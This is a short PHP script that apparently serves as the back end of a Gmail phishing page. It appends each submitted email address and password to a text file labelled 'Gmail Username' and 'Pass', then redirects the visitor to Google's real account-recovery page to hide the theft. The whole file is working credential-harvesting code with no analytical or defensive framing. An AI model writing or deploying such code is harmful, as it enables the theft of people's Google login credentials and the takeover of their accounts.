<?php

file_put_contents("../userpass/usernames.txt", "Gmail Username: " . $_POST['email'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://accounts.google.com/signin/v2/recoveryidentifier');
exit();
?>